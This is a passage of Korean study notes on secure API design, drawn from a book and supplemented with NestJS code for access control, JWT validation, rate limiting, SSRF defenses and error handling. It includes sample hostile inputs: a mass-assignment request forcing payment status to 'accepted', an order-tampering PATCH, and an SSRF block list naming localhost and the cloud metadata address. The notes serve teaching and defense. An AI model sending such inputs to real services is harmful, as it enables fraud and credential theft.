# Part 7. 안전한 API 설계·구현 (보안 심화 실무) (출처: Secure APIs: Design, Build, and Implement)

> 이 부의 관점: "공격자는 평범한 사용자처럼 보인다." 이 책에 따르면 API 공격의 대부분은 **로그인한 정상 사용자**가 시도한다.
> 그래서 방화벽이 아니라 **설계와 접근 제어 로직**이 진짜 방어선이다.
> TLS, JWT 구조, OAuth 기본은 앞의 Part 6에서 다뤘으므로 여기서는 "실무에서 어떻게 안 뚫리게 만드는가"에 집중한다.
>
> 💡 보충 표기 안내(원서 외): 원서의 예제는 Python(FastAPI) 기준이다. 이 부의 **TypeScript/NestJS 코드 블록, `🔗 NestJS 연결` 문단, `SaaS에서 중요한 이유` 소절은 저자가 새로 쓴 보충**이며 원서에 없다. 그 밖에 `(보충)`이 붙은 문장도 원서 근거가 없는 일반 지식이다.

### 1. 보안을 "나중에 덧붙이지" 말고 "처음부터 넣는다" (Shift-left)

#### 1.1 두 가지 접근
- **덧붙이는 보안(Bolt-on)**: 다 만든 뒤 보안 테스트를 돌리고, 나온 취약점을 하나씩 땜질한다.
- **내장하는 보안(Security by design)**: 설계 단계부터 "이 입력은 뭘 허용할까?"를 정한다.

#### 1.2 왜 다른가 — sort_by 예시
`GET /products?sort_by=...` 파라미터를 추가한다고 하자.
- 땜질: SQL 인젝션이 발견되면 정규식으로 "영문 단어 하나만"으로 막는다. → 그래도 `sort_by=stock` 같은 <strong>숨은 필드 조회(속성 열거)</strong>는 그대로 가능하다.
- 설계: 처음부터 `sort_by`를 `price | review` <strong>열거형(enum)</strong>으로 제한한다. → 인젝션과 속성 열거가 **동시에** 사라진다.

#### 1.3 SaaS에서 중요한 이유
- 사고의 대부분은 "암호화 안 함" 같은 일반 취약점이 아니라 **비즈니스/접근 제어 로직 결함**이다. 스캐너가 못 찾는다.
- 설계 단계에서 보안을 챙기면 끝에 가서 재설계·재구현·재배포를 반복하는 일이 줄고, 더 빠르고 자신 있게 릴리스할 수 있다고 책은 말한다. (DORA 조사 인용)
- 단, 시프트 레프트가 만능은 아니다. 배포 전 QA·보안 테스트를 대체하지 못하며, 출시 후 **관측(로그)·자동 탐지·대응, 침해 시 무엇을 할지 적은 런북**도 함께 가져가야 한다.

> 📖 원문: 3.1

### 2. 위협 모델링(Threat Modeling) — 공격자의 눈으로 보기

#### 2.1 4단계 질문
위협 모델링은 아래 4개 질문에 답하는 회의다. 개발자·PO·QA가 같이 한다.

| 단계 | 질문 | 하는 일 |
|---|---|---|
| 1. 분해 | 우리가 뭘 만들고 있나? | 데이터 흐름도(DFD)로 컴포넌트와 호출 관계 그리기 |
| 2. 식별·순위 | 무엇이 잘못될 수 있나? | STRIDE로 위협 나열, 가능성×영향으로 순위 매기기 |
| 3. 대응 | 어떻게 할까? | 완화/제거/이전/수용 중 선택 |
| 4. 검증 | 충분히 했나? | 대응이 실제로 위협을 막는지 확인 |

- 자주 놓치는 것: **내부 서비스/외부 API 호출 흐름**을 그림에서 빼먹는 것. (예: 아바타 URL을 받아 서버가 호출하면 SSRF 경로가 생긴다.)

#### 2.2 STRIDE 6가지

| 글자 | 위협 | API 예시 |
|---|---|---|
| S | 위장(Spoofing) | 남의 계정/토큰 탈취 |
| T | 변조(Tampering) | `PATCH /orders/1 {"status":"paid"}` |
| R | 부인(Repudiation) | "내가 안 했다" 증명 못 함 → **감사 로그** 필요 |
| I | 정보 노출(Information disclosure) | 과다 응답, 스택 트레이스 |
| D | 서비스 거부(DoS) | 무제한 요청 |
| E | 권한 상승(Elevation of privilege) | 일반 유저가 관리자 API 호출 |

#### 2.3 위협에 대한 4가지 대응
- **완화(Mitigate)**: 속도 제한 추가 등으로 위험을 줄인다.
- **제거(Eliminate)**: 꼭 필요하지 않은 기능을 없앤다. (임의 URL 가져오기 기능 등)
- **이전(Transfer)**: 책임을 사용자에게 넘긴다. (공유 링크 관리 책임 등)
- **수용(Accept)**: 위험이 작으면 그냥 둔다. (초기 서비스의 가입 프로모션 악용 등)
- 대응은 **비즈니스 결정**이다. 그래서 이해관계자와 같이 정한다.

#### 2.4 SaaS에서 중요한 이유
(보충) 새 기능(웹훅, 초대, 결제, 내보내기)을 추가할 때마다 짧게라도 "무엇이 잘못될 수 있나" 회의를 하면 코드 리뷰로는 못 보는 결함을 미리 잡을 수 있다. 책은 처음이라면 작게 시작해 월 1회나 격주처럼 자주 해 보라고 권한다.

> 📖 원문: 2.2

### 3. 제로 트러스트(Zero-Trust) API 원칙

핵심 문장: **"아무것도 믿지 말고, 항상 검증하라."**

#### 3.1 제로 트러스트 API의 특징
- 모든 엔드포인트를 보호한다. (공개 엔드포인트도 스크래핑·남용 대비)
- 필요 없는 엔드포인트/오퍼레이션은 **아예 노출하지 않는다**.
- 모든 호출이 올바른 자격증명(토큰 등)을 갖췄는지 확인한다.
- **사용자 단위 + 역할 단위 접근 제어**를 최소 권한으로 적용한다.
- 요청의 모든 데이터(본문·쿼리·경로)를 검증한다.
- **응답**도 보내기 전에 검증한다.
- **서드파티/내부 서비스/DB에서 온 데이터**도 검증한다.
- 사용자 활동을 감시해서 이상 징후에 반응한다.

#### 3.2 "로그인했으니 괜찮다"는 착각
- "인증된 사용자니까 접근 제어를 느슨하게"는 가장 흔한 실수다.
- 책이 인용한 통계로는 API 공격의 약 95%가 인증된 사용자에게서 나온다.
- 그러므로 <strong>인증(누구냐) ≠ 인가(이걸 해도 되냐)</strong>를 매 요청, 매 리소스마다 따로 확인한다.

#### 3.3 JWT 검증은 "전 항목"을 본다
토큰을 받으면 최소한 다음을 확인한다: 헤더 `alg`, 서명, `iss`(발급자), `aud`(대상), `exp`(만료), 권한 클레임.

> 🔗 NestJS 연결: 인증 Guard는 "이 컨트롤러만"이 아니라 <strong>글로벌 Guard로 기본 잠금(deny by default)</strong>을 두고, 공개 엔드포인트만 `@Public()` 같은 데코레이터로 예외 처리하는 방식이 제로 트러스트에 맞다.

> 📖 원문: 3.2

### 4. 모든 것을 검증하라 (Validate Everything)

#### 4.1 검증(Validation) vs 정제(Sanitization)
- **검증**: 스키마에 맞는지 확인 (길이 1000자 이하인가, enum 값인가).
- **정제**: 악성 요소를 제거/무해화.
- 클라이언트(React 등)가 검증해도 소용없다. 공격자는 `curl`로 API를 **직접** 부른다.

#### 4.2 검증해야 하는 5개 흐름

| 흐름 | 위험 |
|---|---|
| 요청(Request) | 악성/깨진 입력 |
| 응답(Response) | 민감 필드 유출, 스키마 불일치 |
| 서드파티 API | 침해된 외부 서비스가 악성 데이터 주입 |
| 내부 서비스 간 | 작은 스키마 실수가 연쇄 500 에러로 전파 |
| DB 데이터 | 잘못된 마이그레이션/수동 수정으로 오염된 값 |

- "우리 DB 데이터니까 안전"도 아니다. 마이그레이션 실수, 수동 SQL, 버그로 값이 오염된다.
- 응답 직전에도 스키마 검증을 하면, 이상 데이터가 **사용자에게 나가기 전에** 발견되고 추적할 수 있다.

#### 4.3 예시: NestJS 전역 ValidationPipe
```ts
// (보충) 저자 작성 NestJS 예시 — 원서는 Pydantic/OpenAPI로 같은 원칙을 보인다
// main.ts — 모든 입력 DTO에 대해 화이트리스트 검증
app.useGlobalPipes(new ValidationPipe({
  whitelist: true,            // DTO에 없는 속성은 제거
  forbidNonWhitelisted: true, // 없는 속성이 오면 400으로 거부
  transform: true,
}));
```

> 🔗 NestJS 연결: 요청은 `ValidationPipe`(class-validator), 응답은 `ClassSerializerInterceptor` 또는 응답 DTO 매핑으로 "양방향 검증"을 만든다.

> 📖 원문: 3.3

### 5. "내부 API"라는 건 없다

#### 5.1 사고 사례의 교훈 (Optus)
- 내부용 고객 조회 API를 인증 없이 만들었다. "사설망에서만 돌 거니까."
- 실수로 인터넷에 열린 테스트 네트워크에 배포됐고, 수백만 고객 정보가 노출됐다.

#### 5.2 원칙
- 사설망 배치(네트워크 분리)는 **좋은 방어층이지만 유일한 전략이 아니다**.
- 내부 API도 인증·인가·검증을 똑같이 적용한다. (배포 실수, 내부자 실수/악의에 대비)
- 민감한 데이터를 다룰수록 접근 제어는 엄격해야 한다.

#### 5.3 SaaS에서 중요한 이유
백오피스(관리자) API, 서비스 간 API 같은 "우리끼리 쓰는 API"는 설계·보안 노력을 덜 받기 쉽다. 책도 백오피스 API가 접근 제어 부재, 과다 노출, 문서 부재를 자주 겪는다고 지적한다.

> 📖 원문: 3.4

### 6. 모르는 API는 지킬 수 없다 (인벤토리와 스펙)

#### 6.1 API 스프롤(sprawl)의 세 얼굴
- **섀도(Shadow) API**: 문서·검토 없이 몰래 배포된 API
- **좀비(Zombie) API**: 폐기했어야 하는데 안 내려서 계속 살아있는 옛 버전
- **고스트(Ghost) API**: 라이브러리/인프라가 우리도 모르게 여는 엔드포인트 (디버그 엔드포인트, 클라우드 메타데이터 등)

#### 6.2 대책
- **OpenAPI 스펙**을 모든 API에 둔다. 사람도 기계도 읽을 수 있는 "공격면 지도"다. 테스트·검증에도 재사용된다.
- API 카탈로그(목록)를 유지한다. 최소한 이름·버전·설명·담당 팀 표라도 좋다.
- 배포 담당자(인프라/운영)와 대화한다. 도구보다 사람이 더 많이 안다.
- 게이트웨이로 모든 인바운드 트래픽을 통과시키면 "등록 안 된 엔드포인트"는 밖으로 못 나간다.

> 🔗 NestJS 연결: `@nestjs/swagger`로 코드에서 OpenAPI 문서를 생성하고 CI에서 diff를 검사하면, 문서에 없는 엔드포인트가 몰래 늘어나는 것을 막을 수 있다.

> 📖 원문: 3.5

### 7. API용 DevSecOps — 개발 흐름 속의 보안

책이 제안하는 이상적인 흐름은 다음과 같다.

1. **설계**: OpenAPI 스펙 작성 → Git에 두고 PR로 변경 리뷰 → "설계 취약점 점검" (민감한 플로우, 노출 데이터, 입력 제약)
2. **기능/보안 테스트를 먼저 작성**: "이 요구사항이 지켜지는가?"를 테스트로 남긴다.
3. **구현**: 스펙과 구현이 일치하는지 검증한다. (책은 퍼저 사용을 예로 든다. 12장) 소비하는 쪽은 목(mock) 서버로 병렬 개발할 수 있다.
4. **배포**: CI/CD 파이프라인에서 테스트하고, 실패하면 설계 단계로 돌아가 취약점을 다시 본다. 자동화하기 어려운 항목(스캘핑, 스크래핑, 브루트포스 방어)은 수동 QA·보안 점검도 한다.
5. **출시**: 문제가 없으면 릴리스하고 API 카탈로그에 등록한다. 라이브 환경에서도 취약점 점검을 하고 결과를 다시 설계로 되돌린다.

- 스펙은 "가설"일 뿐이다. 너무 오래 다듬지 말고 **버전 관리**하며 진화시킨다.
- 하위 호환이 깨지는 변경이 생길 수 있으니 처음부터 API 버전을 관리한다. 옛 버전 폐기는 17절 참고.

> 📖 원문: 3.6

### 8. 접근 제어 실패 ① — BOLA (남의 리소스 접근)

#### 8.1 무엇인가
- 사용자 A가 사용자 B의 리소스(`/orders/123`)를 **ID만 바꿔서** 읽거나 수정하는 것.
- 예전 이름은 IDOR. 책은 API 보안 사고의 대표적인 원인 중 하나로 꼽고, 엔드포인트 하나만 뚫려도 유출로 이어진다고 경고한다.

#### 8.2 원인과 해결 — "ID로만 조회하지 말고 소유자 조건을 함께 건다"
```ts
// (보충) 저자 작성 예시 — 원서(리스트 4.1/4.2)는 SQLAlchemy로 `id`와 `user == sub` 두 조건을 건다
// 취약: 주문 ID만으로 조회
const order = await this.orders.findOne({ where: { id } });

// 안전: 소유자(테넌트/사용자) 조건 동시 적용
const order = await this.orders.findOne({
  where: { id, userId: user.sub, tenantId: user.tenantId },
});
if (!order) throw new NotFoundException(); // 남의 것이면 '없음'으로 응답
```

#### 8.3 상태 코드와 정보 노출
- **404**: "존재 여부도 알려주지 않음" — 민감 리소스에 적합.
- **403**: "있지만 권한 없음" — 프로젝트 티켓처럼 존재를 알려도 되는 경우에 적합.
- 존재하는 리소스와 없는 리소스의 **응답 시간 차이**로도 열거(side-channel)가 가능하다. 응답 시간이 일정하도록 신경 쓴다.

#### 8.4 SaaS에서 중요한 이유
멀티테넌트 SaaS에서 BOLA는 곧 **다른 고객사 데이터 유출**이다. 모든 조회 쿼리에 `tenantId` 조건이 들어가는지가 최우선 점검 항목이다.

> 🔗 NestJS 연결: 서비스/리포지토리 계층에서 테넌트 스코프를 강제(요청 스코프 provider, TypeORM/Prisma 미들웨어의 자동 where 삽입)하면 개발자가 조건을 깜빡해도 새지 않는다.

> 📖 원문: 4.2–4.3

### 9. 접근 제어 실패 ② — 깨진 인증(Broken Authentication)

#### 9.1 자주 터지는 곳

| 문제 | 설명 |
|---|---|
| 브루트포스 | 비밀번호/코드를 무한 시도 (예: 6자리 재설정 코드) |
| 크리덴셜 스터핑 | 다른 사이트에서 유출된 계정을 대입 |
| 약한 비밀번호 정책 | 쉬운 비밀번호 허용 |
| 사용자 열거 | "가입되지 않은 이메일입니다" 식의 구분 가능한 응답/멀티스텝 로그인 |
| URL에 토큰/비밀번호 | 브라우저 기록·서버 접근 로그에 남음 |
| 민감 정보 변경에 재인증 없음 | 토큰을 탈취하면 이메일·비밀번호까지 바꿈 |
| 토큰 검증 실패 | 서명 미검증, 만료 미확인, `alg: none` 허용 |

#### 9.2 실무 규칙
- 인증 시스템은 **직접 만들지 말고** IdP(Auth0, Okta, Keycloak 등)를 쓴다. 우리 몫은 "올바르게 연동하고 **검증**하는 것"이다.
- 비밀번호·이메일 변경 같은 민감 작업은 **현재 비밀번호 재확인**을 요구한다.
- (보충) 로그인/비밀번호 재설정 실패 응답은 계정 존재 여부를 알려주지 않는 동일한 메시지를 쓴다. (책은 멀티스텝 로그인이 사용자 열거 기회가 된다고만 지적한다.)
- 자격증명은 URL이 아니라 헤더/본문으로 보낸다. (URL은 브라우저 기록과 서버 접근 로그에 남는다.)
- 브루트포스 방어는 14절 참고.

> 📖 원문: 4.4–4.5

### 10. 토큰(JWT) 발급·검증·수명 관리 실무

#### 10.1 발급 시 원칙
- 페이로드에는 **`iss`, `sub`, `aud`, `iat`, `exp`** + 권한 정보만. **이름·이메일 같은 PII는 넣지 않는다** (JWT는 암호화가 아니라 서명일 뿐, 누구나 디코딩해서 읽는다).
- 토큰 종류: **액세스 토큰**만 API 접근 판단에 쓴다. 사용자 정보가 담긴 ID 토큰(OIDC)은 API 접근 검증에 쓰지 않는다.
- 서명 알고리즘: 대칭키(HS256)는 서명·검증에 같은 키를 쓰므로 키가 여러 곳에 퍼져 유출 위험이 크다. <strong>비대칭 키(개인키로 서명, 공개키로 검증)</strong>를 선호한다.
- RS256도 구현이 잘못되면 서명 위조에 취약하다(Bleichenbacher 공격). 그래서 책은 **PS256 또는 EdDSA** 같은 대안을 권한다. (FAPI는 RS256을 금지한다.)
- RSA 키는 최소 2048비트 (책 예시는 3072).
- 만료(`exp`)는 짧게. (책 예시는 1시간, 액세스 토큰은 보통 1~24시간이라고 언급)
- 인증 시스템 자체는 직접 만들지 않고 IdP를 쓰는 것이 우선이다. 직접 발급해야 하면 Keycloak 같은 자체 호스팅 IdP, 그것도 안 되면 검증된 라이브러리를 쓴다.

#### 10.2 검증 시 원칙 (가장 많이 사고 나는 곳)
1. **허용 알고리즘을 코드에 고정**한다. 토큰 헤더의 `alg`를 믿지 않는다. (`none`, `nonE` 대소문자 우회, 알고리즘 혼동 공격 방지)
2. `iss`와 `aud`를 반드시 검증한다.
3. 만료(`exp`)를 확인한다.
4. 검증된 대형 라이브러리를 쓰고, 알려진 공격 사례로 **자체 테스트**도 한다.
5. IdP 토큰이면 JWKS 엔드포인트에서 `kid`로 키를 찾아 검증한다.

```ts
// (보충) 원서는 Python PyJWT 예제. 아래 jose 코드는 같은 원칙을 Node로 옮긴 저자 작성 예시
import { jwtVerify, createRemoteJWKSet } from 'jose';

const JWKS = createRemoteJWKSet(new URL('https://auth.example.com/.well-known/jwks.json'));

export async function verifyAccessToken(token: string) {
  const { payload } = await jwtVerify(token, JWKS, {
    issuer: 'https://auth.example.com/',
    audience: 'https://api.example.com',
    algorithms: ['PS256', 'EdDSA'], // 알고리즘 고정
  });
  return payload; // sub, permissions 등
}
```

#### 10.3 리프레시 토큰과 폐기
- 액세스 토큰은 짧게, 만료되면 **리프레시 토큰**으로 갱신한다. 리프레시 토큰은 클라이언트에게 의미 없는 무작위 문자열(불투명)이다.
- 리프레시 토큰이 유출돼 재사용되는 것을 막으려면 갱신할 때마다 새 리프레시 토큰을 주고 이전 것은 못 쓰게 하는 <strong>회전(rotation, 1회용)</strong>을 쓴다. 유효기간도 제한한다. 정해진 기간은 없으니 서비스의 보안 요구에 맞춘다.
- 머신 간 클라이언트는 sender-constrained 토큰(mTLS, DPoP)을 권한다. (05a 참고)
- (보충) JWT는 발급 후 회수가 어려워서 짧은 수명이 사실상 "폐기 전략"이 된다. 즉시 차단이 필요하면 서버 측에 세션/토큰 ID(`jti`) 폐기 목록을 두는 방법이 있다. 책은 토큰 폐기(revocation) 절차를 자세히 다루지 않는다.

#### 10.4 게이트웨이와 코드, 둘 다
- API 게이트웨이가 토큰을 검증해 주더라도 **애플리케이션 코드에도 검증 폴백**을 둔다. 게이트웨이가 오동작하거나 특정 API가 게이트웨이 뒤에 없을 수 있다.

> 🔗 NestJS 연결: `AuthGuard`에서 위 검증 함수를 호출해 `request.user`에 클레임을 넣고, 이후 Guard/서비스가 이것을 근거로 인가한다.

> 📖 원문: 7.2, 7.4.5(리프레시), 8.2–8.3, 8.4.2(JWKS)

### 11. 접근 제어 실패 ③ — BOPLA: 대량 할당과 과다 노출

#### 11.1 대량 할당 (Mass Assignment)
사용자가 보낸 JSON을 그대로 DB 모델에 넣으면, 공격자가 **서버만 바꿔야 하는 필드**를 덮어쓴다.
```
POST /payments   {"amount": 1000000, "currency": "USD", "status": "accepted"}
```
- 결제 상태, 주문 상태, 포인트, 할인, `isAdmin`, `role` 등이 대표적 표적이다.
- 해결: <strong>입력 전용 모델(DTO)</strong>을 따로 만들어 허용 필드만 받는다.

```ts
// (보충) 원서는 Python Pydantic 예제(MakePaymentSchema). 아래 NestJS DTO는 저자 작성
class MakePaymentDto {
  @IsNumber() @Min(1) @Max(1_000_000) amount!: number;
  @IsIn(['USD', 'KRW']) currency!: string;
  // status, id는 아예 없음 → whitelist로 들어와도 제거/거부
}

@Post()
create(@Body() dto: MakePaymentDto) {
  return this.payments.create({ ...dto, status: 'pending' }); // 서버가 값을 정함
}
```

#### 11.2 과다 데이터 노출 (Excessive Data Exposure)
- DB 엔티티를 그대로 `return user;` 하면 비밀번호 해시, 내부 플래그, 생년월일이 딸려 나간다.
- "데이터 모델 ≠ 객체 모델 ≠ 리소스 모델 ≠ 메시지 모델" — **응답 DTO를 별도로 정의**한다.
- 공개 검색 API에 이메일·주소를 넣지 않는다. 내부 모델이 새면 공격자가 비즈니스 규칙(위험 계산 등)까지 파악한다.

```ts
// (보충) 저자 작성 예시
class UserResponseDto {
  @Expose() id!: string;
  @Expose() name!: string;
}
// ClassSerializerInterceptor + @SerializeOptions({ strategy: 'excludeAll' }) → @Expose() 붙인 필드만 출력
```

#### 11.3 입력 모델과 출력 모델을 분리하는 이유
- 하나의 `Payment` 스키마로 입/출력을 같이 쓰면 `id`, `status` 같은 서버 속성이 입력에 열린다.
- 입력은 `MakePayment`, 출력은 `Payment`로 나누고 입력 쪽은 **추가 속성 금지**를 켠다.

> 🔗 NestJS 연결: `ValidationPipe({ whitelist: true, forbidNonWhitelisted: true })` + `ClassSerializerInterceptor`. 엔티티를 컨트롤러에서 직접 반환하지 않는다.

> 📖 원문: 4.6, 6.5

### 12. 접근 제어 실패 ④ — BFLA: 역할 우회

#### 12.1 무엇인가
- 일반 사용자가 관리자/개발자 전용 <strong>기능(엔드포인트)</strong>을 호출하는 것 (수직 권한 상승).
- 반대로 같은 역할끼리 남의 데이터를 보는 것이 BOLA(수평 권한 상승)다.

#### 12.2 흔한 원인
- 관리자 API를 `/api/admin/...`에 두고 문서에서 숨기면 안전할 거라고 믿는다. (**숨기는 것은 보안이 아니다**)
- 관리자 엔드포인트에서 역할 검사를 빼먹는다.

#### 12.3 구현 원칙
- 역할(RBAC)은 IdP에서 관리하고 토큰의 클레임으로 받는다.
- 역할 검사는 **모든 관리자 엔드포인트에 필수**로 적용한다. (기본 거부)
- 세분화된 스코프(엔드포인트 단위 permissions)는 유연하지만 단점이 있다: 권한 목록을 계속 최신으로 유지해야 하고, 보안 구성이 토큰으로 드러나며, 토큰이 커져 헤더 크기 한도를 넘을 수도 있다. 스코프가 지나치게 많으면 **역할로 묶어** 단순화하라는 신호다.
- 관리자용 클라이언트/audience를 분리하면 일반 로그인으로 얻은 토큰으로는 관리자 API에 못 들어간다. 관리자 API는 토큰의 `aud`와 `permissions`에 admin이 있는지 확인한다. (책 8.6)
- 사용자 속성(직급, 지역, 소속 프로젝트 등)으로 판단하는 ABAC도 있으나 복잡해져 테스트가 어려우므로, 쓴다면 접근 모델을 가정 없이 명시해야 한다.
- 관리자 API를 숨겨 두는 것만으로는 부족하다. 책은 접근 제어가 빠진 채로 발견되는 사례(Shopify, Bumble)를 든다.

```ts
// (보충) 저자 작성 예시 — 원서(리스트 4.11, 8.15)는 토큰의 permissions에 "admin"이 있는지 확인한다
@Roles('admin')
@UseGuards(JwtAuthGuard, RolesGuard)
@Get('admin/students')
listStudents() { /* ... */ }
```

> 🔗 NestJS 연결: `RolesGuard` + `Reflector`로 `@Roles()` 메타데이터를 읽는 표준 패턴. 컨트롤러 전체에 붙여 실수로 빠지는 것을 막는다.

> 📖 원문: 4.7–4.8, 8.5–8.6, 7.7

### 13. 민감 비즈니스 플로우 남용

#### 13.1 무엇인가
- 기술적으로는 "정상 요청"인데 **비즈니스에는 피해**인 사용 방식.
- 사례: 스캘핑(재고 사재기), 추천인 보상 무한 획득용 가짜 계정, 가짜 리뷰, 콘텐츠 스크래핑, 쿠폰 재사용.
- SQL 인젝션·XSS·브루트포스처럼 흔적이 뚜렷한 공격은 WAF가 식별·차단하지만, 비즈니스 플로우 공격은 도메인 논리와 얽혀 있어서 일반 도구는 사실상 못 본다. (책 12.5)

#### 13.2 대응 전략
- 어떤 플로우가 민감한지 **설계 단계에서** 식별하고 위협 모델링한다.
- 자동화 요청 완화: User-Agent 확인(한계 있음), **CAPTCHA**, 행동 패턴 분석.
- **속도/간격 분석**: 사람은 단계 사이에 몇 초가 걸리지만, 봇은 1ms 만에 카탈로그→상세→결제를 통과한다.
- 의심되면 스로틀링, 명확하면 차단.
- 자동화 접근을 허용해야 하면 **파트너 프로그램**으로 만들고 호출을 세밀히 추적한다.
- 쿠폰(책 12.5의 시나리오): 같은 쿠폰 재사용은 409, 남의 쿠폰 사용은 403으로 거부하고, 이를 테스트로 만든다. (보충) 구현은 서버 측 트랜잭션/유니크 제약으로 "1인 1회"를 원자적으로 처리하는 방식이 일반적이다.
- 책의 4.10 예시(단순화): User-Agent가 브라우저인지 확인 + 한 사용자는 24시간에 한 번만 구매. 책도 이것은 임시 방편이며 실제로는 위협 탐지 시스템이 낫다고 말한다.

#### 13.3 SaaS에서 중요한 이유
무료 체험 남용, 초대 보상, 크레딧, 쿠폰, 사용량 과금은 SaaS 수익 구조와 직결된다. 이것이 "보안 문제"로 취급되지 않아 자주 뚫린다.

> 📖 원문: 4.9–4.10, 12.5

### 14. 속도 제한(Rate Limiting)과 무제한 리소스 소비

#### 14.1 위협
- DDoS 외에도, **CPU/DB를 많이 쓰는 엔드포인트 몇 번 호출**만으로 서버가 죽을 수 있다. (리포트, 검색, 내보내기)
- 서버리스/오토스케일 환경은 트래픽 폭탄이 곧 <strong>요금 폭탄(denial-of-wallet)</strong>이 된다.
- 로그인, 재설정 코드 검증은 **브루트포스**의 표적이다.

#### 14.2 실무 규칙
- **엔드포인트별로 다르게** 제한한다. 무거운/민감한 곳은 엄격하게, 일반 조회는 느슨하게. (10단계 플로우인데 8번에서 막으면 사용자가 이탈)
- 기준은 **IP + 계정 + 세션/디바이스**를 함께 본다. (IP만 바꾸는 우회가 흔함)
- 로그인: 예를 들어 한 계정에 10~15회 실패 시 잠금하고 안전한 비밀번호 재설정 방법을 안내한다.
- 사용자에게 MFA를 권장하고 민감 엔드포인트에는 CAPTCHA를 둔다. (책 5.1) 책 예시는 "24시간 안에 계정당 10회, IP당 10회 시도하면 잠금/차단"이며, 서비스 특성에 맞게 숫자를 조정하라고 한다.
- (보충) 계정 잠금은 그 자체가 남의 계정을 막는 DoS 수단이 될 수 있으므로 임시 잠금·추가 검증과 함께 설계한다.
- 이메일로 새 IP 확인, 지리적 위치 이상 감지 같은 <strong>속도 검증(velocity check)</strong>을 고려한다.
- IP는 법에 따라 개인정보일 수 있으니(GDPR 등) 수집·보관 고지를 한다.
- 클라우드 비용 상한/경보를 설정한다.
- 1차 방어는 CDN/WAF/게이트웨이(예: Cloudflare, 클라우드 제공 방어), 2차는 애플리케이션 레벨 제한. 여러 층으로 (defense in depth).

```ts
// (보충) 저자 작성 예시. 원서는 FastAPI 미들웨어로 IP·계정별 시도 횟수를 셌다.
// app.module.ts — @nestjs/throttler (전역 기본 + 로그인 엄격)
ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])

@Throttle({ default: { limit: 5, ttl: 60_000 } })
@Post('login')
login(@Body() dto: LoginDto) { /* ... */ }
```
> (다중 인스턴스에서는 카운터를 Redis 같은 공유 저장소에 둬야 한다. 메모리 카운터는 인스턴스마다 따로 센다.)

> 🔗 NestJS 연결: `@nestjs/throttler`의 `ThrottlerGuard`, 저장소를 Redis로 교체, 엔드포인트별 `@Throttle()`.

> 📖 원문: 5.1

### 15. SSRF — 서버가 남의 요청을 대신 보내주는 문제

#### 15.1 무엇인가
- 사용자가 준 URL을 우리 서버가 호출하는 기능(웹훅, 아바타 URL, URL 미리보기, 파일 가져오기)에서 발생한다.
- 공격자가 `http://localhost:8080/...`, 사설 IP, 클라우드 메타데이터(`169.254.169.254`)를 넣으면 **서버 안쪽 자원**이 노출된다.
- 대표 사고: Capital One(메타데이터 서비스에서 IAM 자격증명 탈취).

#### 15.2 대응
- 가능하면 **허용 목록(allowlist)**: 아바타는 지정 도메인에서만.
- 임의 URL(웹훅)이 필요하면:
  - localhost, 내부 네트워크, 클라우드 메타데이터 주소(169.254.169.254) **호출 차단** (책 예시는 `localhost`, `127.0.0.1`이 URL에 들어 있으면 422로 거부하는 단순 차단 목록)
  - 내부망 접근이 없는 격리(샌드박스) 환경에서 호출하고, 가능하면 아웃바운드 프록시로 요청을 검사
  - 클라우드 VM은 메타데이터 v2(IMDSv2, 토큰 필요)를 쓴다.
  - (보충) DNS 조회 결과 IP를 확인하고 리다이렉트를 따라갈 때도 재검사, 응답 크기·시간 제한, 응답 내용을 그대로 사용자에게 돌려주지 않기
- (보충) 문자열 포함 여부만 보는 차단 목록은 우회가 쉬우므로 **IP를 해석한 뒤 검사**하는 것이 더 안전하다. 책은 "SSRF는 완전히 막을 수 없고 완화할 뿐"이라고 말한다.

```ts
// (보충) 저자 작성 예시. 원서 코드가 아님
import { lookup } from 'node:dns/promises';
import ipaddr from 'ipaddr.js';

async function assertPublicUrl(raw: string) {
  const url = new URL(raw);
  if (url.protocol !== 'https:') throw new BadRequestException('https only');
  const { address } = await lookup(url.hostname);
  const range = ipaddr.parse(address).range();
  if (range !== 'unicast') throw new BadRequestException('blocked address');
  // 'unicast'만 통과: private/loopback/linkLocal 등은 거부
}
```

> 📖 원문: 5.2–5.3

### 16. 설정 오류·에러 처리·정보 노출 방지

#### 16.1 보안 설정 오류(Security misconfiguration)
- 디버그 모드로 운영, **스택 트레이스가 에러 응답에 노출** (파일 경로, DB 종류, 쿼리 문장이 공격 힌트가 됨)
- 내부 API가 실수로 공개 네트워크에 배포
- 프런트 코드에 API 키·시크릿 노출
- 인가 확인 누락, 공개된 S3 버킷, 인증 없는 CI 서버

#### 16.2 예방
- <strong>IaC(Infrastructure as Code)</strong>와 자동 배포 파이프라인으로 수동 변경을 줄인다.
- 배포마다 **스모크 테스트**: 에러에 스택 트레이스가 없는가, CORS가 올바른가.
- 환경별 플래그(debug 등)를 명시적으로 확인한다.
- 시크릿(API 키, 클라이언트 시크릿)은 프런트 코드에 두지 않는다. 책 예제는 클라이언트 ID·시크릿, 서명 키를 **환경 변수**에서 읽는다. (보충) 운영에서는 시크릿 매니저에서 주입하는 방식이 흔하지만, 책은 시크릿 관리 도구를 다루지 않는다.
- 게이트웨이에서 보안 헤더(CORS, HSTS, CSP)를 일관되게 붙인다. (9.1)

#### 16.3 에러 응답 원칙
- 스택 트레이스에는 파일 경로, 런타임, DB 종류, 실행된 쿼리가 담겨 공격 전략에 쓰인다. 책 예시는 디버그 플래그를 끄는 것(`debug=False`)이 설정 오류 대응의 핵심이라고 한다.
- (보충) 클라이언트에는 **일반화된 메시지 + 요청 ID**만, 상세는 서버 로그에만 남기는 패턴을 쓴다.
- 에러 유형(404 vs 403, 로그인 실패 문구)이 존재 여부를 흘리지 않게 한다. (8.3 참고)

```ts
// (보충) 저자 작성 예시. 원서 코드가 아님
@Catch()
export class AllExceptionsFilter implements ExceptionFilter {
  catch(e: unknown, host: ArgumentsHost) {
    const res = host.switchToHttp().getResponse();
    const status = e instanceof HttpException ? e.getStatus() : 500;
    const requestId = host.switchToHttp().getRequest().id;
    logger.error({ err: e, requestId });            // 상세는 로그로
    res.status(status).json({
      message: status === 500 ? 'Internal server error' : (e as HttpException).message,
      requestId,                                    // 스택/쿼리는 절대 미포함
    });
  }
}
```

> 🔗 NestJS 연결: 전역 `ExceptionFilter`로 에러 응답을 통일하고, `NODE_ENV=production`에서 상세 노출을 끈다. 설정 값은 `ConfigModule`에서 검증(Joi/zod)한다.

> 📖 원문: 5.4–5.5

### 17. API 버전 폐기와 인벤토리 관리

- 새 버전(v2)을 내면 옛 버전(v1)을 **폐기 예정 → 종료**의 단계로 정리한다.
